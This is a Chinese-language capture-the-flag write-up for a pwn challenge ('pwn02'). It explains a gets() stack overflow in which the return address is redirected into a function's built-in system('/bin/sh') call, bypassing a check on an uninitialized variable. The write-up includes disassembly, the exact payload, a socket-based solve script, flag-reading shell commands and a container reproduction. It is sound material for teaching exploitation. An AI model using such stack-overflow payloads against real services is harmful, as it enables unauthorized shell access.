# pwn02 · gets 栈溢出 + 绕过未初始化比较，直达 hackme 内部的 `system("/bin/sh")`

| 项 | 值 |
|----|----|
| 轮次 | 环节二（13:30） |
| 平台题目名 | pwn02 |
| 比赛 qid | NwH7yHPUhNL3YUEx |
| 分类 | pwn |
| 分值 | 500 |
| 交互型 | true（容器） |
| 关键 flag | `flag{403cc1ed-aba3-4b2d-af5e-b9580bfde22c}` |
| 是否解出 | 已解出 |
| **还原完整度** | **A**（原始附件原样归档 + 参考脚本本地实测跑通） |

## 1. 题面（比赛原文，逐字保留）

（平台 description 为空）

`challenges_live.json` 中 `description` 为 `""`，无 `/hint` 提示文本。题目只给附件 + 容器。
（WP 里把本题昵称为「ezstack」，平台真实题目名仍是 `pwn02`。）

## 2. 附件与环境

| 项 | 内容 |
|----|------|
| 附件 | `pwn`（ELF64，16 944 B，未 strip）；原始 ZIP `1e5fc5c908ca3ea57a1f2acdf99f8530.zip`（2 907 B，内含 `pwn` 一个文件） |
| 容器 | `nc 47.94.108.28 34893`（**比赛期间原始地址，会随平台 reset 变化**；比赛期间实测用过的地址还有 `182.92.227.173 22608`） |
| 附件存放 | `attachments/pwn`、`attachments/1e5fc5c908ca3ea57a1f2acdf99f8530.zip` |

二进制指纹（本次实测）：

```
$ python -c "from pwn import *;e=ELF('attachments/pwn',checksec=False);print(e.checksec())"
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

关键符号/地址（实测反汇编得出）：

| 名称 | 地址 | 说明 |
|------|------|------|
| `main` | 0x4011c0 | `setvbuf`×3 → `puts` → `gets(rbp-0x20)` |
| `hackme` | 0x401196 | 入口处 `endbr64; push rbp; mov rbp,rsp; sub rsp,0x10` |
| `[rbp-4] = 1` | 0x4011a2 | `mov dword ptr [rbp-4], 1` |
| `cmp [rbp-4],[rbp-8]` | 0x4011ac | 与被比较的 `[rbp-8]` **从未被赋值** |
| **`hackme+0x1b`** | **0x4011b1** | ★ `lea rdi, [rip+0xe4c]`（= `/bin/sh`）`; call system` |
| `<system@plt>` | 0x401080 | |

## 3. 考点（★核心）

- **考点 1：`gets()` 栈溢出与偏移计算**。`main` 里 `sub rsp,0x20` → `char buf[0x20]` 位于 `rbp-0x20`，`gets` 无长度限制。返回地址在 `rbp+8`，故 **RIP 偏移 = 0x20 + 8 = 0x28**。无 canary，可直接覆盖返回地址。
- **考点 2：识别并绕过"未初始化变量比较"的伪鉴权**。`hackme()` 的逻辑是：`int a = 1; if (a == b) system("/bin/sh");`，而 `b`（`[rbp-8]`）**从未初始化**。这个比较的取值取决于调用者的栈帧残留，**对攻击者不可控**，因此"正常调用 `hackme` 再指望比较通过"是不可靠的。这正是题目设置的**核心卡点**：直觉是"把 hackme 当后门跳过去"，实际跳过去反而什么都拿不到。WP 原话：*"该比较不可靠——直接跳到 hackme 内部指令更稳"*。
- **考点 3：跳进函数内部（`hackme+0x1b`）跳过比较**。0x4011b1 处已经是 `lea rdi, "/bin/sh"; call system`，从这里进入等于**白拿一个现成的 `system("/bin/sh")` 调用点**，比较指令被完全跳过。payload 只要把返回地址改成 `0x4011b1`。
- **考点 4：栈 16 字节对齐恰好成立（不额外垫 ret 才对）**。`hackme+0x1b` 处 `rsp` ≡ 8 (mod 16)，紧接着的 `call system` 压入返回地址使 `rsp` ≡ 0 (mod 16) 进入 `system` —— 正好满足 ABI 与 glibc 2.31 `system` 内 `movaps` 的要求。**若在此链前多垫一个 `ret`，反而会让 `system` 入口错位而崩溃**。这类"越朴素越对"的对齐结论必须实测确认。
- **考点 5：容器极简，没有 `cat` / `ls` / `id`**。拿 shell 后是 dash，`cat /flag` 会 `not found`；取 flag 必须用 **dash 内建 `read`**：`read a < /flag; echo $a`。
- **考点 6（负面对照，实测结论）**：走 `hackme` 本体（0x401196）并把 `saved rbp` 置 1 的"等价路线"**在本附件上不可行**。`gets` 能控制的只有 `saved rbp`（main 的 `[rbp+0]` = hackme 的 `[rbp+8]`）与返回地址（main 的 `[rbp+8]` = hackme 的 `[rbp+0x10]`），而 `hackme` 里 `[rbp-8]` 落在 `gets` **覆盖范围之外**的栈内存，攻击者碰不到（本次本地实测：走本体 + `saved rbp=1` 拿不到 shell）。这解释了为什么"直接跳 `+0x1b`"不是取巧而是唯一稳妥解。

## 4. 设计思路（★核心，站在出题人角度）

- **为什么这样出**：出题人给了一个**看起来是后门、其实是陷阱**的函数 `hackme`。源码逻辑（`hackme.c`）显然长这样：
  ```c
  void hackme(void) {
      int a = 1;          // [rbp-4]
      int b;              // [rbp-8]  —— 故意不初始化
      if (a == b) system("/bin/sh");
  }
  ```
  这种"未初始化栈变量当条件"的写法在真实项目里就是典型的 CWE-457（Use of Uninitialized Variable）；出题人把它当成**必须绕过的门**而不是**必须满足的条件**。
- **难度卡点设计在哪**：
  1. **诱使你走完整函数**。看到 `hackme` 有 `system("/bin/sh")`，最自然的做法是 `payload = padding + p64(hackme)`。但这条路依赖 `[rbp-8]` 恰好等于 1，而它在 `gets` 覆盖范围之外（见 §3 考点 6），实测不通。**卡点 = 必须理解"跳函数入口"与"跳函数内部"的区别**。
  2. **`endbr64` / CET 标记的干扰**。二进制带 `SHSTK` / `IBT` 属性（checksec 显示 Enabled），`hackme` 与 `main` 开头都有 `endbr64`。这会让选手担心"跳 `+0x1b` 会不会因 IBT 崩"。**事实是**：IBT 只在 CPU/内核真正启用 CET 时才检查间接跳转目标，本环境（Ubuntu 20.04 容器）未启用，跳 `0x4011b1` 实测成功。**"看到 CET 标记就放弃跳内部"是本题最大的心理干扰项**。
  3. **对齐方向反直觉**。多数 pwn 题要在 `system` 前补一个 `ret`；本题**补了就崩**（见 §3 考点 4）。不做实测而照抄模板会失败。
- **干扰项 / 诱导项**：
  - `hackme` 是一个**非 static 的全局函数**且在 `.symtab` 里有名字（未 strip），等于把"后门"两个字写在脸上——诱导你去跳函数入口。
  - `main` 里的三次 `setvbuf(stdin/stdout/stderr, 0, 2/1/2, 0)` 看起来像"把 stdio 设成无缓冲"，容易让人误判交互同步方式。
  - 二进制里**没有** `/bin/sh` 字符串以外的可用 gadget 需求，也不给 libc —— 说明预期解法**不需要** libc 泄漏，进一步暗示"直接用函数内部现成的 `system` 调用"。
- **哪些地方是"必须踩坑才会发现"的**：
  1. 跳 `hackme` 本体不通（必须先试一次、拿到"连上了但没 shell"的空回显，才会转去跳 `+0x1b`）；
  2. `+0x1b` 这个偏移要自己从反汇编里数出来（`hackme + 0x1b = 0x4011b1`，且必须落在 `lea rdi` 而不是 `cmp`/`jne` 上）；
  3. 容器里**没有 `cat`**。

## 5. 解题路径（按真实过程，分步骤）

1. **侦察**：
   ```bash
   python ../../_tools/disasm.py attachments/pwn --syms
   # hackme 0x401196 size=42 / main 0x4011c0 size=138
   python ../../_tools/disasm.py attachments/pwn --func main
   # 00401232 lea rax,[rbp-0x20] ; 0040123e call 0x401090(=gets)   -> buf[0x20]
   python ../../_tools/disasm.py attachments/pwn --func hackme
   ```
2. **读 hackme 的反汇编，找到 `lea rdi, "/bin/sh"; call system`**：
   ```
   004011a2  c745fc01000000  mov dword ptr [rbp-4], 1
   004011a9  8b45fc          mov eax, dword ptr [rbp-4]
   004011ac  3b45f8          cmp eax, dword ptr [rbp-8]     <-- [rbp-8] 未初始化
   004011af  750c            jne 0x4011bd
   004011b1  488d3d4c0e0000  lea rdi, [rip + 0xe4c]         <-- ★ 目标入口
   004011b8  e8c3feffff      call 0x401080                  <-- system
   ```
   `0x4011b1 - 0x401196 = 0x1b`。
3. **构造 payload**：`b'A'*0x20 + p64(0xdeadbeef) + p64(0x4011b1)`（中间 8 字节是 `saved rbp`，值任意），末尾 `\n` 结束 `gets`。
4. **取 flag**（容器无 `cat`）：`read a < /flag; echo $a`。

## 6. 参考解法（代码）

完整可跑脚本：`solve/solve.py`（**纯标准库 socket，不依赖 pwntools**，HOST/PORT 参数化，带重试与 `--target/--rbp` 备选参数）。

核心片段：

```python
BUF          = 0x20
OFFSET       = BUF + 8          # 0x28
SYSTEM_BINSH = 0x4011b1         # hackme+0x1b: lea rdi,"/bin/sh" ; call system

def p64(x): return struct.pack('<Q', x)

payload = b'A' * BUF + p64(0xdeadbeef) + p64(SYSTEM_BINSH)
t.send(payload + b'\n')         # gets() 以 \n 结束

# 容器极简，只有 dash 内建
t.send(b'read a < /flag; echo $a\n')
```

## 7. Flag 与验证记录

| 项 | 值 |
|----|----|
| flag | `flag{403cc1ed-aba3-4b2d-af5e-b9580bfde22c}` |
| 提交接口返回 | `code=0`，`status=1`，`message="答案正确，该题目已被攻克，不计分"`，`pass=true` |
| 提交时间 | 2026-09-14 13:44:58 |
| 证据文件 | `D:\2026\湾区杯\决赛\work\submit_results_live.json` 中 qid `NwH7yHPUhNL3YUEx` 的记录；同题 WP `work\_wp_dump\pwn02.txt` |

**本地复现验证（本次实测）**：

```
$ docker build -t timu/round2-pwn02:latest deploy/
$ docker run -d --name round2_pwn02 -p 127.0.0.1:19992:9999 timu/round2-pwn02:latest
$ python solve/solve.py --host 127.0.0.1 --port 19992 --retries 1
[*] connected 127.0.0.1:19992
[*] payload = A*32 + 0xdeadbeef + 0x4011b1
[+] shell 回显:
flag{403cc1ed-aba3-4b2d-af5e-b9580bfde22c}


[FLAG] flag{403cc1ed-aba3-4b2d-af5e-b9580bfde22c}
```

**负面对照（本次实测，用来确认卡点真实存在）**：

```
$ python solve/solve.py --host 127.0.0.1 --port 19992 --target 0x401196 --rbp 1 --retries 1
[*] payload = A*32 + 0x1 + 0x401196
[+] shell 回显:
                                   <-- 空：走 hackme 本体拿不到 shell
[!] 第 1 次未匹配到 flag
```

## 8. 还原说明（诚实写）

- **已有原始件**：`attachments/1e5fc5c908ca3ea57a1f2acdf99f8530.zip`（原始题目包，2 907 B）原样归档；其中的 `pwn`（16 944 B）平铺归档为 `attachments/pwn`。ZIP 内只有这一个文件，**没有附带 `.c` 源码**（比赛期 WP 文本提到"含 `ezstack.c`"，但真实 ZIP 内不含；此处以真实 ZIP 为准）。
- **重建部分**：
  - `deploy/Dockerfile` + `deploy/docker-compose.yml` 为**重建的部署件**：`ubuntu:20.04`（glibc 2.31）+ `socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/app/pwn` + `/flag`（已实测）。
  - `solve/solve.py` 为**重写**的纯 socket 版本（比赛期脚本用 pwntools，见 `work\pwn02\pwn02_solve.py`、`work\pwn02\pwn02_readflag.py`），已本地实测跑通。
- **未能还原 / 需要标注的差异**：
  1. **原题源码 `ezstack.c` 未拿到**（WP 声称 ZIP 内含，实际 ZIP 里只有 `pwn`）。§4 里引用的 `hackme` 源码是**按反汇编逐条还原的逻辑等价重写**，不是原始源码，已在此明确标注。
  2. **WP 中的"等价路线"未复现成功**。WP 第三节第 4 点写"用 hackme 本体 0x401196 并把 saved rbp 置 1（则 `[rbp-8]=1` 恒等于 `[rbp-4]`），两条路均已实测可用"。本次在**同一附件、重建容器**上实测该路线**失败**（见 §7 负面对照），原因是 `[rbp-8]` 落在 `gets` 覆盖范围之外。**以本次实测为准**；该差异可能与 WP 当时所用二进制/栈内容不同有关，不能作为可用解法收录。
  3. **未实测**：真实比赛容器已下线，无法用原始 `nc 47.94.108.28 34893` 复测；本次全部在 `deploy/` 重建容器上验证。
- **可复现性验证**（跑什么 → 得什么）：

  ```bash
  cd timu/round2_1330/pwn02
  docker build -t timu/round2-pwn02:latest deploy/
  docker run -d --name round2_pwn02 -p 19992:9999 timu/round2-pwn02:latest
  python solve/solve.py --host 127.0.0.1 --port 19992
  # 期望：打印 [FLAG] flag{403cc1ed-aba3-4b2d-af5e-b9580bfde22c}
  ```
  已实测通过。

## 9. 复现步骤

```bash
cd timu/round2_1330/pwn02

# 方式一：本地重建容器复现（推荐，已实测）
docker compose -f deploy/docker-compose.yml up -d
python solve/solve.py --host 127.0.0.1 --port 9998

# 方式二：打比赛期间的下发地址（地址会随平台 reset 变化，用 agent show 取新的）
python solve/solve.py --host 47.94.108.28 --port 34893

# ⚠️ 不建议用 _tools/tcpserver.py 做本题的"无容器"验证：
#    它在 Windows 上 spawn 的是 Windows 版可执行文件（需 MinGW 重编译），
#    并且没有 /flag 文件可读，验证不出真正的取 flag 环节。请用上面的容器方式。

# 静态确认（不需要容器）
python ../../_tools/disasm.py attachments/pwn --func hackme   # 应看到 0x4011b1 lea rdi,[rip+0xe4c]
python -c "from pwn import *;print(ELF('attachments/pwn',checksec=False).checksec())"
```
